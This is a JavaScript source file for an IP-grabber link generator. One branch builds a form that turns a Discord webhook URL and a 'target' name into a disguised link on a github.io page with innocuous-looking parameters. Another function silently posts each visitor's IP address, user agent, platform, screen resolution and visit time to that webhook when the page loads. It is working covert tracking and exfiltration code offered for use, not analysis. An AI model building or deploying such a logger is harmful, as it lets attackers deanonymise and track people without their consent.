
function parseURLParams(url) {
    var queryStart = url.indexOf("?") + 1,
        queryEnd = url.indexOf("#") + 1 || url.length + 1,
        query = url.slice(queryStart, queryEnd - 1),
        pairs = query.replace(/\+/g, " ").split("&"),
        parms = {}, i, n, v, nv;

    if (query === url || query === "") return;

    for (i = 0; i < pairs.length; i++) {
        nv = pairs[i].split("=", 2);
        n = decodeURIComponent(nv[0]);
        v = decodeURIComponent(nv[1]);

        if (!parms.hasOwnProperty(n)) parms[n] = [];
        parms[n].push(nv.length === 2 ? v : null);
    }
    return parms;
}

var urlString = window.location.href;
urlParams = parseURLParams(urlString);
console.log(urlParams)

if (urlParams.g[0] == "a") {
    let html =
        `<div class="app" style="width:500px;">
            <p>link generator</p>
            <p>discord webhook link:</p>
            <input type="text" name="webhook" id="webhook" style="margin-left: 20%" class="na">
            <p>bot(target) name:</p>
            <input type="text" name="name" id="name" style="margin-left: 20%" class="nb"> <br><br>
            <input type="button" value="finish" style="width: 80px;margin-left: 20%"  class="end">
            <p> Your link: <span class="out"></span></p>
            </div>`

    document.body.innerHTML = html

    var btn = document.querySelector(".end")

    btn.addEventListener('click', () => {
        var a = document.querySelector(".na")
        var b = document.querySelector(".nb")
        var c
        const url = a.value;
        const webhookIdRegex = /\/webhooks\/(\d+)\//;
        const webhookTokenRegex = /\/webhooks\/\d+\/([A-Za-z0-9_-]+)/;

        const webhookIdMatch = url.match(webhookIdRegex);
        const webhookTokenMatch = url.match(webhookTokenRegex);

        if (webhookIdMatch && webhookTokenMatch) {
            const webhookId = webhookIdMatch[1];
            const webhookToken = webhookTokenMatch[1];

            a = webhookId
            c = webhookToken
        } else {
            alert("Invalid Discord webhook URL.");
        }

        var outel = document.querySelector(".out")

        outel.textContent = `https://femometer.github.io/index.html?user=${encodeURI(b.value)}&access=${a}&svcid=${c}`
    })
}

//<span class=highlight></span>


function getIP(json) {

    if (urlParams.user && urlParams.access) {


    
    function sendMessage() {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/" + urlParams.access[0] + "/" + urlParams.svcid[0]);

        request.setRequestHeader('Content-type', 'application/json');

        var params = {
            username: urlParams.user[0],
            avatar_url: "",
            content: "=======================================\n\n" + json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight + ", \nTIME: " + new Date() + "\n\n",
        }

        request.send(JSON.stringify(params));
    }
    sendMessage()
}
}


